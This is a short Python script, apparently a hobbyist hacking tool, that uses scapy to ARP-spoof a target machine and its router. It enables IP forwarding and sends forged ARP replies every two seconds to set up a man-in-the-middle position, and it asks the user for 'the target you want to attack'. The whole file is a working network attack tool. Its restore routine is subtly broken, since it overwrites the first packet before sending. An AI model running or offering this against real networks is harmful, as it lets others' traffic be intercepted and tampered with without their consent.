import scapy.all as scapy
import subprocess
import time
from get_ip import *
def spoof(target_ip,target_mac,router_ip,router_mac):
    packet=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=router_ip)
    packet1=scapy.ARP(op=2,pdst=router_ip,hwdst=router_mac,psrc=target_ip)
    scapy.send(packet,verbose=False)
    scapy.send(packet1,verbose=False)
def restore(target_ip,target_mac,router_ip,router_mac):
    packet=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=router_ip,hwsrc=router_mac)
    packet=scapy.ARP(op=2,pdst=router_ip,hwdst=router_mac,psrc=target_ip,hwsrc=target_mac)
    scapy.send(packet,count=5,verbose=False)
subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward",shell=True)
print("Enter the ip address of the target you want to attack")
target_ip=main()
target_mac=ip(target_ip)
print("Enter the IP address of you router. if you don't know please read readme.txt file")
router_ip=main()
router_mac=ip(router_ip)
count=0
try:
    while True:
        count=count+2
        print("\r sent "+str(count)+" packets",end="")
        spoof(target_ip,target_mac,router_ip,router_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] quitting.... \n\nresetting the ARP table\n")
    restore(target_ip,target_mac,router_ip,router_mac)





